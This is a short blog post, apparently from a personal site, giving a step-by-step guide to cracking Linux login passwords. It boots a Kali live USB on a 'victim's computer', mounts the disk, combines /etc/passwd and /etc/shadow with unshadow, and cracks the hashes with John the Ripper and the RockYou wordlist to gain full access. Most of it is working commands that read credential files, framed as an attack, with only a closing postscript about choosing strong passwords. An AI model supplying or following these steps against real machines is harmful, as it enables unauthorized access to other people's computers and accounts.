---
title: "How to crack almost any OS password "
date: 2023-01-16T02:33:48+05:30
draft: false
description: "use john-the-ripper to actually crack the login passwords of almost any computer"
tags: [kali, cybersecurity]
---

## Introduction

Use the infamous [RockYou.txt](https://github.com/ohmybahgosh/RockYou2021.txt) password list containing 14 million used passwords to brute force the user passwords in almost any system you've got

> Your computer is not safe, make your password stronger

## Overview

- boot into the system using kali live usb
- create a hash of etc password and etc shadow (default location where passwords are stored in Linux)
- crack it using tools like john the ripper

## Steps

1. Create a live USB of Kali Linux
2. Boot into this usb from the victim's computer
3. mount the root partition under /mnt

```bash
lsblk # shows connected drives
mount /dev/sda2 /mnt  # mount the drive in /mnt. You'll have to change the sda name according to lsblk output
```

4. Navigate to etc from /mnt and create hash out of shadow and password file using the `unshadow` util of kali linux. Save this in the home directory

> In linux, the passwords of all users are stored as a hash in a /etc/shadow file. The corresponding names can be taken from `/etc/password` file

```bash
sudo unshadow /etc/passwd /etc/shadow > ~/shadowhash #storing the unshadowed file in home directory
```

5. Crack this using tools like [john-the-ripper](https://www.openwall.com/john/). Pass in a wordlist if the password may be complex.

```bash
john --format=crypt shadowhash
# or
john shadowhash --wordlist=/usr/share/wordlists/rockyou.txt
```

This should give you the password in plain text format for the victim's OS in 70% + cases.

<br>
Reboot the system and log in to the victim's OS with cracked password to gain full access to the system.

Note: This article focuses only on Linux machines. However, keep in mind that similar thing can be used for Windows systems as well.

<hr/>

P.S. It goes without saying that the purpose of the article is to show that we need to have a really complex password in our computers. Otherwise it can be cracked like above. Use proper long passwords containing both alphanumeric and special characters. Add a personal tinge something to the password as well so that it cannot be directly matched from a wordlist.

The End
